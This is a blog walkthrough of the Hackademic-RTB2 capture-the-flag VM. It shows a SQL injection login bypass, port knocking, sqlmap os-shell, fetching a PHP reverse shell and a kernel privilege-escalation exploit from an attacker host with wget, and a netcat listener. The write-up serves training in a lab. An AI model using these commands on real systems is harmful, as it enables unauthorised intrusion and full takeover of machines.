<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Hackademic-RTB2 (Boot2Root)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-hackademic-rtb2-boot2root/" rel="bookmark"><time class="entry-date published" datetime="2016-07-26T18:04:39+00:00">July 26, 2016</time><time class="updated" datetime="2025-06-10T20:13:15+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to solve a very simple and easy CTF challenge of the vulnhub. This is the second realistic hackademic challenge (root this box) by mr.pr0n. Download the target it from <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">here</a></strong>.</span></p>
<p><span style="color: #000000;"><strong>Penetrating Methodologies</strong></span></p>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">SQL-Injection on Login Form</span></li>
<li><span style="color: #000000;">Decrypting Hint to Get ports for port knocking</span></li>
<li><span style="color: #000000;">Port Knocking using NMAP</span></li>
<li><span style="color: #000000;">SQL-Injection using Sqlmap on URL</span></li>
<li><span style="color: #000000;">Upload and execute a Reverse shell</span></li>
<li><span style="color: #000000;">Reverse connection (netcat)</span></li>
<li><span style="color: #000000;">Exploiting target (exploit 15285)</span></li>
<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s Start!!!</strong></span></p>
<p><span style="color: #000000;">Start off with finding the target using:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Vr9f7Nqs1oo/W7ua_N7Rj2I/AAAAAAAAamI/QSq0_xjzQbkPsfSReqjkKytVPjHeNdQogCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Our target is <strong>192.168.1.102.</strong> Now scan the target with nmap aggressive:</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.102</pre>
<p><span style="color: #000000;">With the nmap scan, you can perceive the port 80 is open and port 666 is filtered.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pe5cJRdaGx4/W7ubCVzpacI/AAAAAAAAam0/XpwkparfGagxEF44W9Un4HvYFrWuWgmJwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Further, when you will navigate to port 80 by exploring its IP in the browser, you will be welcomed by a login page as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-7xpdPG84nXQ/W7ubDK1K_SI/AAAAAAAAam8/Zy-cp_qlUgoZQ7V6nt3oTQ3zuUBO_XzQgCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Look at this login form; we can try for SQL injection to bypass this page. So, we had tried the following malicious character inside the text field as shown in the below image.</span></p>
<pre class="lang:default decode:true">Username: ' or 1=1--'
Password: ' or 1=1--'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4vghX5l3l5M/W7ubDbvr_vI/AAAAAAAAanA/fz07Q0q_JIsyUOaKd9dVmbQt6sJkLbiGACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Superb!! We have bypassed the login form. But here, the author has left a message for which indicates that this is not the correct place to hunt the clue for any loophole.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-hdEeet7KFd0/W7ubD4SYK9I/AAAAAAAAanI/q63v-acTw-IEv6E_u2N9PLGPyRbQ8MKLgCLcBGAs/s1600/5.png"/></strong></span></p>
<p><span style="color: #000000;">So we looked into its source code and notice some encoded text here.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-MtCkpMIwv0Q/W7ubDyyl8bI/AAAAAAAAanE/ICMpQS6q3GIKddW9O62K7tY_BqNDfC2jwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Since the above text was URL encoded string and we have used burp suite to decode it. So now decode it into HEX and then HEX to Text.</span></p>
<p><span style="color: #000000;"><strong><em>“Knock Knock Knocking on heaven’s door”</em></strong></span></p>
<p><span style="color: #000000;">Feels like it is some kind of port knocking and the 8-bit binary words could be possible some ports.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gGjaZwbQVZ8/W7ubEZ5dODI/AAAAAAAAanM/orb34N2pnLw-yxEgm8TXINIScMama3P9wCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Further, we copied the binary string so that we can decode it, to obtain readable text.  As you can see it, here we have obtained a series of port number <strong>1001:1101:1011:1001</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-rctcsjciYeE/W7ubFOlhimI/AAAAAAAAanQ/NcLXT9tH8t4yEQRbn85KA0iMfGyKH0yKgCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We have used nmap to recursively hit the ports using the <strong>-r</strong> parameter.</span></p>
<pre class="lang:default decode:true">nmap -r -p 1001,1101,1011,1001 192.168.1.102</pre>
<p><span style="color: #000000;">After this when we scanned the target IP once again using nmap and found that the port 666 is open and also running Apache server.</span></p>
<pre class="lang:default decode:true">nmap -sV 192.168.1.102</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-tAKZzHJS7G8/W7ua_cQInRI/AAAAAAAAamM/7VK7HC4XtA8exKRzgohOWJ-B5bcWUzNkgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">At this moment, we navigate to the newly opened port on the browser by exploring to the following URL</span></p>
<pre class="lang:default decode:true">http://192.168.1.102:666</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-o-6qHPbSmhk/W7ua_YE-x4I/AAAAAAAAamQ/TlP_Wr2JDTAtvcHLXr43iZFQKkVXAtmrQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">While browsing the website, we came across the “<strong>List of content items…</strong>” this URL was holding multiple parameters. I found this URL little bit suspicious against SQL injection, let’s ensure this through sqlmap.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eQ8oNswdCRw/W7ubAEjI5OI/AAAAAAAAamU/fxkUa0Gie6YMbo8rC77uDiRXx-qPgWn4QCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">To test the URL for SQL-Injection we will use sqlmap to enumerate the database name with help of the following command.</span></p>
<pre class="lang:default decode:true">sqlmap -u "http://192.168.1.102:666/index.php?option=com_abc&amp;view=abc&amp;letter=List+of+content+items...&amp;Itemid=3" --dbs --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-wnufhsWJThs/W7ubAViDzMI/AAAAAAAAamY/VKywFEYK5KsAsFzcaaLm91btfKgtwVTKACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Yuppie!!! This VM is vulnerable to SQLi and we have successfully enumerated the possible database name “Joomla” through sqlmap, now let’s try to inject our payload with help of –os-shell option.</span></p>
<pre class="lang:default decode:true">sqlmap -u "http://192.168.1.102:666/index.php?option=com_abc&amp;view=abc&amp;letter=List+of+content+items...&amp;Itemid=3" -D joomla --os-shell --batch</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-yxtl4pLp-XY/W7ubAtYoCbI/AAAAAAAAamc/l7jlxcq9J5E06zetTUj3J5S2OmcO32xTACLcBGAs/s1600/14.png"/></strong></span></p>
<p><span style="color: #000000;"><strong>Superb!!</strong> We have spawned the os-shell of the target machine.</span></p>
<p><span style="color: #000000;">Now we will use this os- shell to upload a php backdoor, here we used pentestmonkey’s <strong>php-reverse-shell.php </strong>which is saved inside /usr/share/webshells/php directory, change the listening IP address as your device and the port number as your choice and start a python server using the following command for transferring this file.</span></p>
<pre class="lang:default decode:true">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;">And in the os-shell, we will use the wget to download the reverse shell.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.109/revshell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UrsqO8PHqok/W7ubBGHzMWI/AAAAAAAAamg/BoZKheX2Bfwr4QMzBRmJkiTp4IaKpwvugCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Since we have uploaded the malicious php inside the /var/www, therefore let’s navigate to the web browser and try to execute the revshell.php file but do not forget to start netcat listener.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KklbXJ8e6_k/W7ubBX9zT2I/AAAAAAAAamk/Y_F8P9AmYsAJwvFGv1YNbJPWyTudwUa2QCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;"><strong>Boom!! </strong> We have compromised the target shell successfully, Here we have discovered the Linux kernel is version being 2.6.32, after searching not for long on the internet we found the “RDS kernel exploit for privilege escalation from user to root”.</span></p>
<p><span style="color: #000000;">So we downloaded the 15285.c from <em><u>https://www.exploit-db.com/exploits/15285/</u></em> and move it to Desktop where our python server was already running.</span></p>
<p><span style="color: #000000;">On the target machine, we first use the python one-liner to spawn proper tty shell</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">Now we move to tmp folder cd<strong> /tmp</strong> to download the exploit on the target machine using wget command and compile the C file using gcc.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.109/15285.c
gcc 15285.c -o kernel</pre>
<p><span style="color: #000000;">Then give the file executable permissions and now run the compiled exploit</span></p>
<pre class="lang:default decode:true">chmod 777 kernel
./kernel</pre>
<p><span style="color: #000000;">and BOOM you got the root. Now go to root directory only to discover that there is a key.txt file</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lGPfMMc4Hlk/W7ubBSFLnkI/AAAAAAAAamo/iI18BIMrA6swKq03aYRbVAJ8J2ZZ9H1cQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">When we tried to read the file then it was found to be encoded into base 64.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-VE1jt-RiTM4/W7ubCR--c_I/AAAAAAAAamw/fmHpTvylqgAUAJE-ELrc7dggEtKjT-usQCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">With the help of the following command, we will try to decrypt the content of this file.</span></p>
<pre class="lang:default decode:true">base64 -d Key.txt &gt; key</pre>
<p><span style="color: #000000;">Now when we tried to open the file using file command it gave us the description of PNG image</span></p>
<pre class="lang:default decode:true">file key</pre>
<p><span style="color: #000000;">To view it we copied it to /var/www only to download it and view the image.</span></p>
<pre class="lang:default decode:true ">cp key /var/www</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-IHO8FVuLoFg/W7ubCbV2YtI/AAAAAAAAams/XAuYvxrUzukX6On_hHMkkQ5Zqbxzo9wzQCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now download the file from the URL http://192.168.1.102:666/key and open in your system to discover that it’s the root flag and you have successfully solved the CTF.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-HDqLxd798UA/W7ubDBJV6XI/AAAAAAAAam4/3fvW0lgP8tMEL8QA55QsbtqawBuC8O4UACLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>:  Deepanshu is a Certified Ethical Hacker and a budding Security researcher. Contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/deepanshu-k-a4248b138/">here</a>.</strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
